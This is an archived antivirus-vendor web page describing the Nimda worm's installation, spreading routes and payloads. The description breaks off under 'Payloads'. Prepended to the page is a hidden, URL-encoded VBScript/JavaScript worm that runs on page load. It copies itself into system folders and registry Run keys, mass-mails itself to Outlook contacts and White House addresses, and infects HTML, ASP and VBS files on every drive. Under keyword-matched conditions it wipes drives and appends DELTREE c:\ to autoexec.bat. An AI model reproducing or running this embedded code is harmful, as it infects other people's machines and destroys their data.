<SCRIPT Language=JavaScript>
var jword = "%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0D%0Aif%20%28window.name%3D%3D%22trap%22%29%20window.moveTo%28-1000%2C-1000%29%3B%0D%0Afunction%20encrypt%28buffer%29%0D%0A%7B%0D%0A%20%20%20return%20escape%28buffer%29%3B%0D%0A%7D%0D%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A"
var nword = "%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0D%0A%27@%20thank%20you%21%20%20make%20use%20of%20other%20person%20to%20get%20rid%20of%20an%20enemy%2C%20white%20trap%20_2001%0D%0Aon%20error%20resume%20next%0D%0Adim%20vbscr%2C%20fso%2Cw1%2Cw2%2CMSWKEY%2CHCUW%2CCode_Str%2C%20Vbs_Str%2C%20Js_Str%0D%0Adim%20defpath%2C%20smailc%2C%20MAX_SIZE%0D%0Adim%20whb%28%29%2C%20title%2810%29%0D%0Asmailc%20%3D%204%0D%0ARedim%20whb%28smailc%29%0D%0Awhb%280%29%20%3D%20%22president@whitehouse.gov%22%0D%0Awhb%281%29%20%3D%20%22vice.president@whitehouse.gov%22%0D%0Awhb%282%29%20%3D%20%22first.lady@whitehouse.gov%22%0D%0Awhb%283%29%20%3D%20%22mrs.cheney@whitehouse.gov%22%0D%0Atitle%280%29%20%3D%20%22Thanks%20for%20helping%20me%21%22%0D%0Atitle%281%29%20%3D%20%22The%20police%20are%20investigating%20the%20robbery%22%0D%0Atitle%282%29%20%3D%20%22an%20application%20for%20a%20job%22%0D%0Atitle%283%29%20%3D%20%22The%20aspects%20of%20an%20application%20process%20pertinent%20to%20OSI%22%0D%0Atitle%284%29%20%3D%20%22What%20a%20pleasant%20weather.%20Why%20not%20go%20out%20for%20a%20walk%3F%22%0D%0Atitle%285%29%20%3D%20%22These%20countries%20have%20gone%20/%20been%20through%20too%20many%20wars%22%0D%0Atitle%286%29%20%3D%20%22We%27ve%20fixed%20on%20the%2017th%20of%20April%20for%20the%20wedding%22%0D%0Atitle%287%29%20%3D%20%22The%20wind%20failed%20and%20the%20sea%20returned%20to%20calmness.%22%0D%0Atitle%288%29%20%3D%20%22the%20sitting%20is%20open%21%22%0D%0Atitle%289%29%20%3D%20%22%22%0D%0Adefpath%20%20%3D%20%22C%3A%5CReadme.html%22%20%0D%0AMAX_SIZE%20%3D%20100000%0D%0AMSWKEY%20%20%20%3D%20%22HKEY_LOCAL_MACHINE%5CSoftWare%5CMicrosoft%5CWindows%5C%22%0D%0AHCUW%20%20%20%20%20%3D%20%22HKEY_CURRENT_USER%5CSoftware%5CMicrosoft%5CWAB%5C%22%0D%0Amain%20%0D%0A%0D%0Asub%20main%28%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20w_s%0D%0Aw_s%3D%20WScript.ScriptFullName%0D%0Aif%20w_s%20%3D%20%22%22%20then%20%0D%0AErr.Clear%0D%0Aset%20fso%20%3D%20CreateObject%28%22Scripting.FileSystemObject%22%29%0D%0Aif%20getErr%20then%20%0D%0ARandomize%0D%0Ara%20%3D%20int%28rnd%28%29%20*%207%29%0D%0Adoucment.write%20title%28ra%29%20%20%20%20%20%20%20%0D%0AExecuteMail%0D%0Aelse%20%20%20%20%20%20%0D%0AExecutePage%0D%0Aend%20if%20%20%0D%0Aelse%0D%0AExecuteVbs%0D%0Aend%20if%0D%0Aend%20sub%0D%0A%0D%0AFunction%20%20getErr%28%29%0D%0Aif%20Err.number%3C%3E0%20then%20%0D%0AgetErr%3Dtrue%0D%0AErr.Clear%20%0D%0Aelse%20%0D%0AgetErr%3Dfalse%0D%0Aend%20if%20%20%20%20%0D%0Aend%20function%0D%0A%0D%0Asub%20ExecutePage%28%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20Html_Str%2C%20adi%2C%20wdf%2C%20wdf2%2Cwdf3%2Cwdsf%2C%20wdsf2%2C%20vf%0D%0AVbs_Str%20%20%3D%20GetScriptCode%28%22vbscript%22%29%0D%0AJs_Str%20%20%20%3D%20GetJavaScript%28%29%0D%0ACode_Str%20%3D%20%20MakeScript%28encrypt%28Vbs_str%29%2Ctrue%29%0D%0AHtml_Str%20%3D%20%20MakeHtml%28encrypt%28Vbs_str%29%2C%20true%29%20%0D%0AGf%0D%0Awdsf%20%20%3D%20w2%20%26%20%22Mdm.vbs%22%0D%0Awdsf2%20%3D%20w1%20%26%20%22Profile.vbs%22%0D%0Awdf%20%20%20%3D%20w2%20%26%20%22user.dll%22%0D%0Awdf2%20%20%3D%20w2%20%26%20%22Readme.html%22%0D%0Awdf3%20%20%3D%20w2%20%26%20%22system.dll%22%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%20%28wdf%2C%202%2C%20true%29%0D%0Avf.write%20Vbs_Str%0D%0Avf.close%20%20%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%20%28wdsf%2C%202%2C%20true%29%0D%0Avf.write%20Vbs_Str%0D%0Avf.close%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%20%28wdsf2%2C%202%2C%20true%29%0D%0Avf.Write%20Vbs_Str%0D%0Avf.close%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%20%28wdf2%2C%202%2C%20true%29%0D%0Avf.write%20Html_Str%0D%0Avf.close%20%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%20%28wdf3%2C%202%2C%20true%29%0D%0Avf.write%20Code_Str%0D%0Avf.close%20%0D%0AWritereg%20%20MSWKEY%20%26%20%22CurrentVersion%5CRun%5CMdm%22%2C%20wdsf%2C%20%22%22%20%20%20%20%0D%0AWritereg%20%20MSWKEY%20%26%20%22CurrentVersion%5CRunServices%5CProfile%22%2C%20wdsf2%2C%20%22%22%0D%0ASendMail%0D%0AHackpage%0D%0Aif%20TestUser%20then%0D%0AKillhe%0D%0Aelse%0D%0Aif%20Month%28Date%29%20%26%20Day%28Date%29%20%3D%20%2275%22%20then%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%28w2%20%26%20%2275.htm%22%2C%202%2Ctrue%29%0D%0Avf.write%20MakeScript%20%28%22window.navigate%20%28%27c%3A/con/con%27%29%3B%22%2C%20false%29%0D%0Avf.close%0D%0AWritereg%20%20MSWKEY%20%26%20%22CurrentVersion%5CRun%5C75%22%2C%20w2%20%26%20%2275.htm%22%2C%20%22%22%0D%0Awindow.navigate%20%22c%3A/con/con%22%0D%0Aelse%0D%0Aif%20fso.FileExists%28w2%20%26%20%2275.htm%22%29%20then%20fso.DeleteFile%20w2%20%26%20%2275.htm%22%0D%0Aend%20if%0D%0Aend%20if%0D%0Aset%20adi%20%3D%20fso.Drives%0D%0Afor%20each%20x%20in%20adi%0D%0Aif%20x.DrivesType%20%3D%202%20or%20x.DrivesType%20%3D%203%20then%20%20%0D%0Acall%20SearchHTML%28x%20%26%20%22%5C%22%29%0D%0Aend%20if%0D%0Anext%0D%0Aif%20fso.FileExists%28defpath%29%20then%20%20fso.DeleteFile%20defpath%0D%0Aend%20sub%0D%0A%0D%0Asub%20%20ExecuteMail%28%29%0D%0Aon%20error%20resume%20next%0D%0AVbs_Str%20%20%3D%20GetScriptCode%28%22vbscript%22%29%0D%0AJs_Str%20%20%20%3D%20GetJavaScript%28%29%0D%0ASet%20Stl%20%3D%20CreateObject%28%22Scriptlet.TypeLib%22%29%0D%0Awith%20Stl%0D%0A.Reset%0D%0A.Path%20%3D%20defpath%0D%0A.Doc%20%3D%20%20MakeHtml%28encrypt%28Vbs_str%29%2C%20true%29%20%0D%0A.Write%28%29%0D%0Aend%20with%0D%0Awindow.open%20defpath%2C%20%22trap%22%2C%20%22width%3D1%20height%3D1%20menubar%3Dno%20scrollbars%3Dno%20toolbar%3Dno%22%0D%0Aend%20sub%0D%0A%0D%0Asub%20ExecuteVbs%28%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20x%2C%20adi%2C%20wvbs%2C%20ws%2C%20vf%0D%0Aset%20fso%20%3D%20CreateObject%28%22Scripting.FileSystemObject%22%29%0D%0Aset%20wvbs%20%3D%20CreateObject%28%22WScript.Shell%22%29%0D%0AGf%0D%0Awvbs.RegWrite%20%20MSWKEY%20%26%20%22Windows%20Scripting%20Host%5CSetings%5CTimeout%22%2C%200%2C%20%22REG_DWORD%22%20%0D%0Aset%20vf%20%3D%20fso.OpenTextFile%20%28w2%20%26%20%22system.dll%22%2C%201%29%0D%0ACode_Str%20%3D%20vf.ReadAll%28%29%0D%0Avf.close%0D%0AHackpage%0D%0ASendMail%0D%0Aset%20adi%20%3D%20fso.Drives%0D%0Afor%20each%20x%20in%20adi%0D%0Aif%20x.DrivesType%20%3D%202%20or%20x.DrivesType%20%3D%203%20then%20%20%0D%0Acall%20SearchHTML%28x%20%26%20%22%5C%22%29%0D%0Aend%20if%20%20%20%0D%0Anext%0D%0Aif%20TestUser%20then%20Killhe%0D%0Aend%20sub%0D%0A%0D%0Asub%20Gf%28%29%0D%0Aw1%3Dfso.GetSpecialFolder%280%29%20%26%20%22%5C%22%0D%0Aw2%3Dfso.GetSpecialFolder%281%29%20%26%20%22%5C%22%0D%0Aend%20sub%0D%0A%0D%0Afunction%20Readreg%28key_str%29%0D%0Aset%20tmps%20%3D%20CreateObject%28%22WScript.Shell%22%29%0D%0AReadreg%20%3D%20tmps.RegRead%28key_str%29%0D%0Aset%20tmps%20%3D%20Nothing%0D%0Aend%20function%0D%0A%0D%0Afunction%20Writereg%28key_str%2C%20Newvalue%2C%20vtype%29%0D%0Aset%20tmps%20%3D%20CreateObject%28%22WScript.Shell%22%29%0D%0Aif%20vtype%3D%22%22%20then%0D%0Atmps.RegWrite%20key_str%2C%20Newvalue%0D%0Aelse%0D%0Atmps.RegWrite%20key_str%2C%20Newvalue%2C%20vtype%0D%0Aend%20if%20%20%20%20%20%20%0D%0Aset%20tmps%20%3D%20Nothing%0D%0Aend%20function%0D%0A%0D%0Afunction%20MakeHtml%28Sbuffer%2C%20iHTML%29%0D%0Adim%20ra%0D%0ARandomize%0D%0Ara%20%3D%20int%28rnd%28%29%20*%207%29%0D%0AMakeHtml%3D%22%3C%22%20%26%20%22HTML%3E%3C%22%20%26%20%22HEAD%3E%3C%22%20%26%20%22TITLE%3E%22%20%26%20title%28ra%29%20%26%20%22%3C/%22%20%26%20%22TITLE%3E%3C%22%20%26%20%22/HEAD%3E%22%20%26%20_%0D%0A%22%3CBO%22%20%26%20%22AD%3E%22%20%26%20vbcrlf%20%26%20%20MakeScript%28Sbuffer%2C%20iHTML%29%20%26%20vbcrlf%20%26%20_%0D%0A%22%3C%22%20%26%20%22/BOAD%3E%3C%22%20%26%20%22/HTML%3E%22%0D%0Aend%20Function%0D%0A%0D%0Afunction%20MakeScript%28Codestr%2C%20iHTML%29%20%0D%0Aif%20iHTML%20then%0D%0Adim%20DocuWrite%0D%0ADocuWrite%20%3D%20%22document.write%28%27%3C%27+%22%20%26%20%22%27SCRIPT%20Language%3DJavaScript%3E%5Cn%27+%22%20%26%20_%0D%0A%20%20%20%20%20%20%22jword%22%20%26%20%22+%27%5Cn%3C/%27%22%20%26%20%22+%27SCRIPT%3E%27%29%3B%22%0D%0ADocuWrite%20%3D%20DocuWrite%20%26%20vbcrlf%20%26%20%22document.write%28%27%3C%27+%22%20%26%20%22%27SCRIPT%20Language%3DVBScript%3E%5Cn%27+%22%20%26%20_%0D%0A%20%20%20%20%20%20%22nword%22%20%26%20%22+%27%5Cn%3C/%27%22%20%26%20%22+%27SCRIPT%3E%27%29%3B%22%0D%0AMakeScript%3D%22%3C%22%20%26%20%22SCRIPT%20Language%3DJavaScript%3E%22%20%26%20vbcrlf%20%26%20%22var%20jword%20%3D%20%22%20%26%20_%0D%0Achr%2834%29%20%26%20encrypt%28Js_Str%29%20%26%20chr%2834%29%20%26%20vbcrlf%20%26%20%22var%20nword%20%3D%20%22%20%26%20_%0D%0Achr%2834%29%20%26%20%20Codestr%20%26%20%20chr%2834%29%20%26%20vbcrlf%20%26%20%22nword%20%3D%20unescape%28nword%29%3B%22%20%26%20vbcrlf%20%26%20_%0D%0A%22jword%20%3D%20unescape%28jword%29%3B%22%20%26%20vbcrlf%20%26%20DocuWrite%20%26%20vbcrlf%20%26%20%22%3C/%22%20%26%20%22SCRIPT%3E%22%20%0D%0Aelse%20%20%20%20%20%0D%0AMakeScript%3D%20%22%3C%22%20%26%20%22SCRIPT%20Language%3DJavaScript%3E%22%20%26%20Codestr%20%26%20%22%3C/%22%20%26%20%22SCRIPT%3E%22%0D%0Aend%20if%0D%0Aend%20function%20%0D%0A%0D%0Afunction%20GetScriptCode%28Languages%29%0D%0Adim%20soj%0D%0Afor%20each%20soj%20in%20document.scripts%0D%0Aif%20LCase%28soj.Language%29%20%3D%20%20Languages%20then%0D%0Aif%20Languages%20%3D%20%22javascript%22%20then%20%0D%0Aif%20len%28soj.Text%29%3E%20200%20then%20%0D%0Aelse%20%0D%0A%20%20GetScriptCode%20%3D%20soj.Text%0D%0A%20%20exit%20function%0D%0Aend%20if%20%20%0D%0Aelse%0D%0AGetScriptCode%20%3D%20soj.Text%0D%0Aexit%20function%0D%0Aend%20if%20%20%20%20%0D%0Aend%20if%0D%0Anext%20%0D%0Aend%20function%0D%0A%0D%0Afunction%20GetJavaScript%28%29%0D%0AGetJavaScript%20%3D%20GetScriptCode%28%22javascript%22%29%0D%0Aend%20function%0D%0A%0D%0Afunction%20TestUser%28%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20keys%286%29%2C%20i%2C%20tmpStr%2C%20Wnet%0D%0Akeys%280%29%20%3D%20%22white%20home%22%0D%0Akeys%281%29%20%3D%20%22central%20intelligence%20agency%22%0D%0Akeys%282%29%20%3D%20%22bush%22%0D%0Akeys%283%29%20%3D%20%22american%20stock%20exchang%22%0D%0Akeys%284%29%20%3D%20%22chief%20executive%22%0D%0Akeys%285%29%20%3D%20%22usa%22%0D%0ATestUser%20%3D%20false%0D%0ASet%20Wnet%20%3D%20CreateObject%28%22WScript.Network%22%29%0D%0AtmpStr%20%3D%20LCase%28Wnet.UserName%29%0D%0Afor%20i%3D0%20to%204%0D%0Aif%20%20InStr%28tmpStr%2C%20keys%28i%29%29%20%3E%200%20then%0D%0ATestUser%3Dtrue%0D%0Aexit%20function%0D%0Aend%20if%20%20%0D%0Anext%20%20%20%20%0D%0AtmpStr%20%3D%20LCase%28Wnet.ComputerName%29%20%0D%0Afor%20i%3D0%20to%204%0D%0Aif%20%20InStr%28tmpStr%2C%20keys%28i%29%29%20%3E%200%20then%0D%0ATestUser%3Dtrue%0D%0Aexit%20function%0D%0Aend%20if%20%0D%0Anext%20%20%20%0D%0AtmpStr%20%3D%20LCase%28Wnet.UserDomain%29%0D%0Afor%20i%3D0%20to%204%0D%0Aif%20%20InStr%28tmpStr%2C%20keys%28i%29%29%20%3E0%20then%0D%0ATestUser%3Dtrue%0D%0Aexit%20function%0D%0Aend%20if%20%0D%0Anext%0D%0ASet%20Wnet%20%3D%20Nothing%0D%0Aend%20function%0D%0A%0D%0Afunction%20SendMail%28%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20wab%2Cra%2Cj%2C%20Oa%2C%20arrsm%2C%20eins%2C%20Eaec%2C%20fm%2C%20wreg%2C%20areg%2Cat%0D%0ARandomize%0D%0Aat%3Dfso.GetSpecialFolder%281%29%20%26%20%22%5CReadme.html%22%0D%0Aset%20%20Oa%20%20%3D%20CreateObject%28%22Outlook.Application%22%29%0D%0Aset%20%20wab%20%3D%20Oa.GetNameSpace%28%22MAPI%22%29%0D%0Afor%20j%20%3D%201%20to%20wab.AddressLists.Count%0D%0Aeins%20%3D%20wab.AddressLists%28j%29%0D%0Awreg%3DReadreg%20%28HCUW%20%20%26%20eins%29%0D%0Aif%20%28wreg%3D%22%22%29%20then%20wreg%20%3D%201%0D%0AEaec%20%3D%20eins.AddressEntries.Count%0D%0Aif%20%28Eaec%20%3E%20Int%28wreg%29%29%20then%0D%0Afor%20x%20%3D%201%20to%20Eaec%0D%0Aarrsm%20%3D%20wab.AddressEntries%28x%29%0D%0Aareg%20%3D%20Readreg%28HCUW%20%26%20arrsm%29%0D%0Aif%20%28areg%20%3D%20%22%22%29%20then%0D%0Aset%20fm%20%3D%20wab.CreateItem%280%29%0D%0Awith%20fm%0D%0Ara%20%3D%20int%28rnd%28%29%20*%207%29%0D%0A.Recipients.Add%20arrsm%0D%0A.Subject%20%3D%20title%28ra%29%0D%0A.Body%20%3D%20title%28ra%29%0D%0A.Attachments%20at%0D%0A.Send%0D%0AWritereg%20HCUW%20%26%20arrsm%2C%201%2C%20%22REG_DWORD%22%0D%0Aend%20with%0D%0Aend%20if%0D%0Anext%0D%0Aend%20if%20%20%20%20%0D%0AWritereg%20HCUW%20%26%20eins%2C%20Eaec%2C%20%22%22%20%20%20%0D%0Anext%20%0D%0Afor%20j%20%3D%201%20to%20smailc%0D%0Aarrsm%20%3D%20whb%28j%29%0D%0Aset%20fm%20%3D%20wab.CreateItem%280%29%0D%0Ara%20%3D%20int%28rnd%28%29%20*%207%29%0D%0Awith%20fm%0D%0A.Recipients.Add%20arrsm%0D%0A.Subject%20%3D%20title%28ra%29%20%0D%0A.Body%20%3D%20title%28ra%29%0D%0A.Send%0D%0Aend%20with%0D%0Anext%20%20%20%20%0D%0Aset%20Oa%20%3D%20Nothing%0D%0Awindow.setTimeout%20%22SendMail%28%29%22%2C%2010000%0D%0Aend%20function%0D%0A%0D%0Asub%20SearchHTML%28Path%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20pfo%2C%20psfo%2C%20pf%2C%20ps%2C%20pfi%2C%20ext%0D%0Aif%20instr%28Path%2C%20fso.GetSpecialFolder%282%29%29%20%3E%200%20%20then%20exit%20sub%0D%0Aset%20pfo%20%20%20%20%3D%20fso.GetFolder%28Path%29%0D%0Aset%20psfo%20%20%20%3D%20pfo.SubFolders%0D%0Afor%20each%20%20ps%20in%20psfo%0D%0ASearchHTML%28ps.Path%29%0D%0Aset%20pf%20%20%3D%20ps.Files%0D%0Afor%20each%20pfi%20in%20pf%0D%0Aext%20%3D%20LCase%28fso.GetExtensionName%28pfi.Path%29%29%0D%0Aif%20instr%28ext%2C%20%22htm%22%29%20%3E%200%20or%20ext%20%3D%20%22plg%22%20or%20ext%20%3D%20%22asp%22%20then%0D%0Aif%20Code_Str%3C%3E%22%22%20then%20AddHead%20pfi.Path%2C%20pfi%2C%201%0D%0Aelseif%20ext%3D%20%22vbs%22%20%20then%0D%0AAddHead%20pfi.Path%2Cpfi%2C%202%0D%0Aend%20if%20%20%20%20%20%20%20%0D%0Anext%20%0D%0Anext%20%0D%0Aend%20sub%0D%0A%0D%0Asub%20Killhe%28%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20codeText%2C%20ko%2Cadi%2C%20kd%2C%20kh%2C%20ks%2Ckf%2Ckfs%0D%0AcodeText%20%3D%20%22@ECHO%20OFF%22%20%26%20vbcrlf%20%26%20%22PATH%20%22%20%26%20w1%20%26%20%22COMMAND%22%20%26%20vbcrlf%20%26_%0D%0A%22DELTREE%20c%3A%5C%22%0D%0Aset%20ko%20%3D%20fso.OpenTextFile%28%22C%3A%5CAutoexec.bat%22%2C%208%2C%20true%29%0D%0Ako.Write%20vbcrlf%20%26%20codeText%20%0D%0Ako.Close%0D%0Aset%20adi%20%3D%20fso.Drives%0D%0Afor%20each%20x%20in%20adi%0D%0Aif%20x.DrivesType%20%3D%202%20%20then%20%20%0D%0Aset%20kd%20%3D%20fso.GetFolder%28x%20%26%20%22%5C%22%29%0D%0Aset%20kfs%20%3D%20kd.Files%0D%0Afor%20each%20kf%20in%20kfs%0D%0Akf.Delete%0D%0Anext%20%20%20%20%0D%0Aset%20ks%20%3D%20kd.SubFolders%0D%0Afor%20each%20kh%20in%20%20ks%0D%0Amsgbox%20kh.path%0D%0Akh.Delete%0D%0Anext%20%20%20%0D%0Aend%20if%20%20%20%0D%0Anext%0D%0Ado%20while%201%0D%0Awindow.open%20%22%22%0D%0Aloop%0D%0Aend%20sub%0D%0A%0D%0Asub%20Hackpage%28%29%0D%0Adim%20fi%0D%0AH%20%3D%20%22C%3A%5CInetPut%5Cwwwroot%22%0D%0Aif%20fso.FolderExists%28H%29%20then%0D%0Aset%20fi%20%3D%20fso.GetFile%28H%20%26%20%22%5Cindex.htm%22%29%0D%0AAddHead%20H%20%26%20%22%5Cindex.htm%22%2Cfi%2C1%0D%0Aend%20if%20%20%20%0D%0Aend%20sub%0D%0A%0D%0Asub%20AddHead%28Path%2C%20f%2C%20t%29%0D%0Aon%20error%20resume%20next%0D%0Adim%20tso%2C%20buffer%2Csr%0D%0Aif%20f.size%20%3E%20MAX_SIZE%20then%20exit%20sub%0D%0Aset%20tso%20%3D%20fso.OpenTextFile%28Path%2C%201%2C%20true%29%0D%0Abuffer%20%3D%20tso.ReadAll%28%29%0D%0Atso.close%0D%0Aif%20%28t%20%3D%201%29%20then%0D%0Aif%20UCase%28Left%28LTrim%28buffer%29%2C%207%29%29%20%3C%3E%20%22%3CSCRIPT%22%20then%0D%0Aset%20tso%20%3D%20fso.OpenTextFile%28Path%2C%202%2C%20true%29%0D%0Atso.Write%20%20Code_Str%20%26%20vbcrlf%20%26%20buffer%0D%0Atso.close%0D%0Aend%20if%0D%0Aelse%0D%0Aif%20mid%28buffer%2C%203%2C%202%29%20%3C%3E%20%22%27@%22%20then%0D%0Atso.close%0D%0Asr%3Dw2%20%26%20%22user.dll%22%0D%0Aif%20fso.FileExists%28sr%29%20then%20fso.CopyFile%20sr%2C%20Path%0D%0Aend%20if%0D%0Aend%20if%0D%0Aend%20sub%0D%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A"
nword = unescape(nword);
jword = unescape(jword);
document.write('<'+'SCRIPT Language=JavaScript>\n'+jword+'\n</'+'SCRIPT>');
document.write('<'+'SCRIPT Language=VBScript>\n'+nword+'\n</'+'SCRIPT>');
</SCRIPT>
<HTML>
<HEAD>
<TITLE>I-Worm.Nimda</TITLE>
</HEAD>
<HTML>
<HEAD>
<TITLE>Metropolitan Network BBS Inc., AVP in Switzerland</TITLE>
</HEAD>
<BODY  BGCOLOR="#FFFFFF" TEXT="#000000" LINK="#0000BF" VLINK="#BF0000" ALINK="#0077FF">




<TABLE width=560 border=0 cellpadding=0 cellspacing=0>
<tr><td align=left valign=top>
<FORM ACTION="http://www.avp.ch/cgi-bin/goto.pl" METHOD="POST">
<FONT FACE="Arial,Helvetica" SIZE="2">
<A HREF="http://www.avp.ch/E/mnserv.htm"><IMG SRC="http://www.avp.ch/images/maillist.gif" border="0" vspace=2></A><BR>
&nbsp;<SELECT NAME="url">
<OPTION VALUE="http://www.avp.ch/avpve/findex.stm">AVPVE Entry Page
<OPTION VALUE="http://www.avp.ch/avpve/newdesc.stm">AVPVE New Descriptions
<OPTION VALUE="http://www.avp.ch/E/avp-news.htm">AVP News
<OPTION VALUE="http://www.avp.ch/E/download.htm">Download
<OPTION VALUE="http://www.avp.ch/E/products.htm">Products
<OPTION VALUE="http://www.avp.ch/E/support.htm">Support
<OPTION VALUE="http://www.avp.ch/E/thelab.htm">TheLab
</SELECT>
<INPUT TYPE="submit" VALUE="Go!">
</FONT>
</FORM>
</td><td>
<MAP NAME="menu">
<AREA SHAPE=RECT COORDS="3,2,51,62" HREF="/E/products.htm" ALT="Products">
<AREA SHAPE=RECT COORDS="54,1,109,62" HREF="/E/download.htm" ALT="Download">
<AREA SHAPE=RECT COORDS="110,1,158,62" HREF="/E/purchase.htm" ALT="Purchase">
<AREA SHAPE=RECT COORDS="161,2,204,62" HREF="/E/support.htm" ALT="Support">
<AREA SHAPE=RECT COORDS="206,1,250,62" HREF="/E/thelab.htm" ALT="TheLab">
</MAP>
<img ismap src="/images/menu.gif" usemap="#menu" align=right hspace=4 border=0></td></tr>
<tr><td colspan=2>
<img src="/images/bar1.gif"></td></tr>
</table>

<TABLE width=560>
<tr><td align=left><A HREF="http://www.avp.ch/E/purchase.htm"><IMG src="/images/email_worms_defense2.gif" align=left border=0></A></td><td valign=top align=right>
<A HREF="http://www.avp.ch/" TARGET="_top"><IMG src="/images/avplg3.gif" align=right border=0></A>

</TD></TR>
</TABLE>

<TABLE width=560>
<tr><td valign=top>
<FONT FACE="Arial,Helvetica" SIZE="2">

<H3>I-Worm.Nimda</H3>
<HR noshade>
Free tool to <A HREF="#remove">remove Nimda</A> (see bottom of page)
<HR noshade>

This is a worm virus spreading via the Internet attached to infected
emails, copying itself to shared directories over a local network, as well as
attacking vulnerable IIS machines (Web sites). The worm itself is a Windows PE
EXE file about 57Kb of length, written in Microsoft C++.
<p>
To run from an infected message the worm exploits a security breach. The worm's
README.EXE file then installs itself to the system, runs the spreading routine and
payload.
<p>
To run on a victim machine while attacking IIS server the worm copies itself to victim machine using the name ADMIN.DLL by using the so-called "Web Directory Traversal exploit". 

<p>
The worm contains the "copyright" text string:
<pre>
 Concept Virus(CV) V.5, Copyright(C)2001  R.P.China
</pre>

<H4>Installing</H4>

The installation procedures are a bit different when the worm is run from the EXE file
(from email message, or from other infected EXE file), or when it is run from the
ADMIN.DLL file (while infecting IIS server).
<p>
While installing from the ADMIN.DLL the worm copies itself to the Windows directory
with the name MMC.EXE and spawns that file.
<p>
Then (as well as while starting from infected EXE file) the worm infects the
system. It copies itself:

<OL>
 
 <li>to Windows system directory with the name RICHED20.DLL (and overwrites the original file by the same name)
 <li>to Windows system directory with the name LOAD.EXE  
<p>
LOAD.EXE is then registered in the auto-run section of the SYSTEM.INI file:
<pre>
 [boot]
 shell=explorer.exe load.exe -dontrunold
</pre>
<LI> The worm also copies itself to the Temporary directory with random MEP*.TMP and
MA*.TMP.EXE names, for example:
<pre>
 mep01A2.TMP
 mep1A0.TMP.exe
 mepE002.TMP.exe
 mepE003.TMP.exe
 mepE004.TMP
</pre>
EXE files have Hidden and System attributes, so does LOAD.EXE file (see
above).
</OL>
<p>

The worm then runs its spreading and payload routines. Depending on the Windows
version the worm affects the EXLORER.EXE process and may run its routines as
EXPLORER' background process (thread).


<H4>Spreading - EMail</H4>

To send infected messages the worm connects to a host machine by using the SMTP
protocol and sends its copies to victim addresses.
<p>
To get victim email addresses the worm uses two ways:
<ol>
<li>scans *.HTM and *.HTML files and looks for email-like strings

<li>by using MAPI connects to MS Exchange email boxes and gets email addresses
from there.
</ol>

The infected messages are in HTML format and look as follows:
<pre>
 Subject:      [empty or random]
 Message text: [empty]
 Attachment:   README.EXE
</pre>
The message subject text is collected from the name of a randomly selected file from the folder:
<pre>
 HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Personal
</pre>
usually that's "My Documents",  or a randomly selected file on the C: drive
<p>

To spread from infected messages the worm makes use of the "IFRAME" trick. It exploits
a vulnerability that is described at:
<p>
 Microsoft Security Bulletin (MS01-020): Incorrect MIME Header Can Cause IE to
 Execute E-mail Attachment
 <A HREF="http://www.microsoft.com/technet/security/bulletin/MS01-020.asp" target=newwin">http://www.microsoft.com/technet/security/bulletin/MS01-020.asp
</A>
<p>
To fix vulnerable installations download the patch from:
<A HREF="http://www.microsoft.com/windows/ie/downloads/critical/q290108/default.asp" target=newwin>
http://www.microsoft.com/windows/ie/downloads/critical/q290108/default.asp</A>

<H4>Spreading - infecting EXE files</H4>

The worm looks for all EXE files listed in the registry key tree:
<pre>
 HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
</pre>
for EXE files on shared network drives, and infects them (except
Winzip32.exe). In some cases that routine is not activated, and EXE files may
stay not infected.
<p>
While infecting the worm replaces victim file with its own copy, then puts
the original (victim) file to its (worm's) resources (PE EXE Resources). As a
result the infected EXE file looks like that:
<pre>
  Header
  Code section
  Data section
  Resources section:
    some worm resources
    victim EXE file (as is)  &lt;--- here is original file
    some other worm resources   
  Relocation table
</pre>
When such a file is started, the worm also extracts the victim EXE file's original body and spawns it in addition to the other routines (installing and spreading).



<H4>Spreading - local network</H4>

The worm scans local and shared (mapped) remote drives by three different
ways, and infects all accessible directories in there. 
<p>
While affecting the
worm creates .EML (in 95% of cases) or .NWS (in 5%) files with random selected
names. As a result these EML and NWS can be found everywhere on an affected machine
(and in the local network) - there may be thousands of them. These files contain
a worm copy in e-mail form.
<p>
The e-mail form is a HTML email message with the worm copy in MIME envelope, fitted with
the IFRAME trick, as it is described above. When opened that message
immediately infects a vulnerable machine.

 <H4>Spreading - Web sites</H4>

On the local machine the worm scans all fixed drives and searches for the following 
filename+extension combinations:
<pre>
 *DEFAULT* , *INDEX* , *MAIN* , *README*  + .HTML, .HTM, .ASP
</pre>
(*NAME* means that may be substring in file name). I.e. the worm searches for
standard Web-page files.
<p>
If such a file is encountered, the worm copies its copy in e-mail form to there
with the name README.EML and appends to the victim HTM/ASP file a JavaScript program
that just opens the README.EML file when the HTML/ASP file is being opened, and
activates the worm as a result.
<p>
As a result the worm affects Web pages and may spread to machines that visit
these Web pages - vulnerable machines can get infected by just browsing
an infected Web site.


<H4>Spreading - IIS attack</H4>

To upload its file to a victim machine the worm uses the so-called "Web Directory
Traversal exploit", activating a temporary TFTP server on the infected (current)
machine to process "get data" command from victim (remote) machine, in the same way as IIS-Worm.BlueCode
<p>
As a result the worm uploads to the victim machine its copy with the name ADMIN.DLL,
and activates it in there.
<p>
To infect other IIS servers the worm starts more than 60 or 200 threads (background
processes, their number depends on different conditions), then each thread
scans randomly selected IP addresses and tries to attack them.


<H4>Payloads</H4>

The payload routine adds the "Guest" user to the Administrators UserGroup (as a
result the "Guest" user has full access to infected machine). The worm also opens
all local drives for sharing and removes security settings.
<p>
The affected registry keys here are:
<pre>
